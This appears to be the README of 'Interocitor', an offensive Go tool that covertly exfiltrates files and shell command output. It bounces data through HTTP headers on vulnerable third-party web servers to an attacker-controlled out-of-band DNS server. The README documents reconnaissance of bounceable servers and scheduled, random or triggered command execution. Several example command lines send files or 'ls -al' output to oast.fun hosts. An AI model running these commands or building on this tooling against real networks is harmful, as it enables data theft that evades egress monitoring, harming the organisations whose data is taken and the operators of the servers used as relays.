# Interocitor ReadMe

This is an initial beta version. Updates will be ongoing and will gradually improve the functionality and robustness.
At some point I will provide a GUI to make usage easier.

Interocitor is a data-bouncing tool useful for covertly exfiltrating data from a network, or carrying out scheduled reporting/polling, particularly when egress is restricted, monitored, or otherwise controlled.

For more information on using HTTP headers for data bouncing, read this article, or visit the Data Bouncing website:
- https://thecontractor.io/data-bouncing/
- https://databouncing.io

[credit to [@DeathsPirate](https://x.com/DeathsPirate) and [@TheContractorio](https://x.com/TheContractorio) for discovering the original issue]

>[!NOTE]  
> You will need a DNS server under your own control to use the application.

For hobbyist/learning uses, InteractSh is recommended as a DNS server that can be used for PoC and test purposes. Use the client available on GitHub:
https://github.com/projectdiscovery/interactsh
The InteractSh server can be used to collect the data, via its web interface:
https://app.interactsh.com/#/

## Install and Dependency Notes

If building from source, Interocitor uses the following Go modules.

- INI File Reader:	`go get gopkg.in/ini.v1`

- Maps:	`go get golang.org/x/exp/maps`

- DNS:	`go get github.com/miekg/dns`


## Overview
>[!NOTE]  
>you will need a DNS server under your control to use the application.

Interocitor is a multi-purpose tool that allows the user to use the data bouncing technique in several ways.
It can run in Target mode, File mode, Command mode or DNS mode:

- Target Mode:		Reconnaissance of useable channels to identify suitable targets to facilitate exfiltration. Used to identify suitable web servers that can exfiltrate data for the user, via their header processing.
- File Mode:			Used to exfiltrate a file from the restricted network to an external endpoint via a vulnerable web server, typically identified using Target Mode.
- Command Mode:		Used to run one or more shell commands on a machine within a restricted network, exfiltrating the command output afterwards. Cmd execution takes place either once or on a schedule, with command line output being exfiltrated afterwards. The schedule may be according to a fixed time, random time, or on the satisfaction of trigger condition (see details below).
- DNS Mode:			Act as a DNS server to accept lookups containing bounced data.

### Command Line Parameters
Command line usage of Interocitor relies on the following parameters. See the individual sections below for further details and example usage.

> [!NOTE]  
> Settings from config file [`config.ini`] will be used by the application, unless overridden by command line parameter.

# Interocitor ReadMe

## Command Line Parameters

Interocitor can be run with no command-line parameters, provided valid parameters have been specified in the ini file.

### General Parameters

```sh
--config <file>        # Specify a config file to read settings from (default: config.ini)
--no-config            # Disable reading settings from config file
-m, --mode <mode>      # Operational mode: targetcheck | file | cmd | dns (default: file)
-t, --task <task>      # Task(s) to be carried out:
                       # All Modes: bouncecheck | dns
                       # File Mode: exfil | json_extract | extract_decrypt | file_decrypt
                       # Cmd Mode: cmd | filecmd
-n, --num-times <n>    # Number of times to repeat each HTTP request (default: 1)
```

### File Mode Parameters

```sh
-b, --bounce-targets <path>    # Path to file containing potential targets for exfiltration
-d, --domains-file <path>      # Path to file containing list of bouncable domains
-f, --file <path>              # Path to the binary file to be read and exfiltrated
-u, --uuid <uuid>              # Identifier for the current stream
-o, --oob <addr>               # IP or DNS name for the OOB exfil DNS server
--verb <verb>                  # HTTP verb for exfiltration (default: GET)
--append-url                   # Add random suffixes to exfiltration URL to make paths less uniform
```

### Extraction and Decryption Parameters

```sh
-j, --json-file <path>         # Extract (and optionally decrypt) data from this JSON file
-c, --crypt-file <path>        # Extract JSON data to this file before decryption
-l, --output-file <path>       # Write decrypted exfiltrated data to this file (default: output.bin)
```

### Command Mode Parameters

```sh
-s, --cmd <shell_command>      # Command to run in shell (output will be exfiltrated)
--cmd-file <filename>          # Filename containing commands to be executed
-p, --params <param,param,...> # Parameters for the command specified with -s or --cmd
-r, --cmd-frequency <freq>     # Frequency for running commands: once | fixed | random (default: once)
--cmd-time-unit <unit>         # Unit type for frequency: sec | min | hr | day (default: hr)
--cmd-time-interval <n>        # Number of units for frequency (default: 1)
--report-frequency <freq>      # Frequency for returning command outputs: immediate | fixed | random (default: Immediate)
--rep-time-unit <unit>         # Unit for report frequency: sec | min | hr | day (default: hr)
--rep-time-interval <n>        # Interval for reporting (default: 1)
```

### Shell Customisation

```sh
--shell <shelltype>            # Specify a shell (e.g., sh, csh, bash, zsh, powershell)
--shell-output <filename>      # Filename for shell output (default: shellout.txt)
--increment-uuid               # Increment UUID for each cmd execution
--pipe-in                      # Allow system commands to be piped into cmd
--pipe-out                     # Allow cmd output to be piped into system commands
--in-cmds <cmd|cmd|...>        # System commands to be piped into cmd
--out-cmds <cmd|cmd|...>       # System commands for cmd output to be piped into
--cancel-timeout <seconds>      # Auto-cancel cmd execution after specified time (default: 0 = do not cancel)
```

### Triggers and Logging

```sh
--trigger-mode <mode>          # Trigger condition type: cmd | file | dir
--trigger-target <target>      # Target for the trigger condition (command, filename, or directory)
--log                          # Enable logging
--log-file <path>              # Specify log filename
-v, --verbose                  # Enable verbose console output
-h, --help                     # Show usage information and exit
```



## Modes of Operation

### Target Mode

Use **Target Mode** to check whether a host is vulnerable to data bouncing and can be used for exfiltration. This mode requires a file containing suspected or potentially vulnerable URLs as input. The DNS JSON output from this mode can be used in subsequent exfiltration tasks.

#### Examples

Check which URLs in `targets.txt` are valid for data bouncing:

```sh
interocitor --mode target --task bouncecheck -v -b ../config/targets.txt --oob wotmvksfjpdystzjbsgg3e096tnx0mcum.oast.fun
```

Extract valid bounce targets from a DNS server’s JSON file into a text file:

```sh
interocitor --mode target --task json_extract -v -b ../TestData/domains.json -d ../TestData/domains.txt
```

---

### File Mode

**File Mode** is used to exfiltrate data covertly from a network. The `exfil` task sends the data to the OOB DNS server via a randomly selected vulnerable web server. The exfiltrated data is embedded in lookup data and can be extracted using the following tasks:

- `extract_decrypt` - Extract data from the JSON lookup file, decrypt it, and write it to the output file.
- `json_extract` - Extract data from the JSON lookup file to an encrypted output file.
- `file_decrypt` - Decrypt an output file (usually the result of `json_extract`).

> [!NOTE]  
>  If no mode and no task are specified, File Mode will default to `exfil`.

#### Examples

Exfiltrate `beuller.jpg` to the DNS server:

```sh
interocitor -f beuller.jpg --oob example.oast.fun
```

Exfiltrate `beuller.jpg` via a random target from `configs/domains.txt`, with verbose output:

```sh
interocitor --task exfil -v -f beuller.jpg -d ./configs/domains.txt --oob example.oast.fun
```

Extract and decrypt exfiltrated data from `2024-52-22_05_52.json`, placing the final content in `output.jpeg`:

```sh
interocitor --task extract_decrypt -v -j ../../TestData/output.jpeg -l ../../TestData/2024-52-22_05_52.json
```

Extract and decrypt exfiltrated data from `cmdoutput.json` with UUID `0123`, saving it to `cmdout.txt`:

```sh
interocitor --task extractdecrypt -v -j ../../../TestData/cmdoutput.json -l ../../../TestData/cmdout.txt -u 0123
```

---

### Command Mode

**Command Mode** allows execution of shell commands within a restricted network and exfiltration of command output. Commands can be executed once, scheduled periodically, or triggered by specific conditions. The mode supports multiple execution styles:

- Single command execution: `"c"`, `"cmd"`, `"once"`, `"single"`, `"singlecmd"`
- File-based command execution: `"cf"`, `"filecmd"`, `"cmdfile"`

See the *Timings and Triggers* section for scheduling and execution options.

#### Examples

Execute `ls -al` once and exfiltrate the results immediately:

```sh
interocitor --mode cmd --task singlecmd -v --cmd ls --params '-al' --oob wotmvksfjpdystzjbsgg3e096tnx0mcum.oast.fun
```

Execute `ls -al` via a random target from `configs/domains.txt`:

```sh
interocitor --mode cmd --task singlecmd -v --cmd ls --params '-al' -d ./configs/domains.txt --oob wotmvksfjpdystzjbsgg3e096tnx0mcum.oast.fun
```

---



 
DNS Mode
--------
[still under development]


## Timing and Triggers for Multiple Operations and Exfiltrations

Interocitor provides functionality to run commands and upload results regularly. The timing of execution and uploads can be enforced in four ways:

### 1. Fixed Timing
Commands or uploads are executed regularly, with the amount and units specified by the user. 

**Example:**
- Every 8 hours
- Every 5 days

### 2. Scheduled Timing
Commands are executed at a specific future date and time, as provided by the user.

**Example:**
- At `15:25` on `28/09/2026`

### 3. Random Timing
Commands or uploads are executed after a random time interval within a defined range.

**Example:**
- A number of hours between `2` and `40`

### 4. Trigger Timing
Commands or file exfiltration occurs when a specified trigger condition is met.

**Trigger Examples:**
- Output from a shell command changes
- New files are added to a directory
- A specific file increases in size

### Application of Timings
These timing methods are typically applied to:
- **Command Mode** – to execute the same command output at regular intervals.
- **Exfiltration Mode** – to exfiltrate new files as they appear in a specified directory.

---

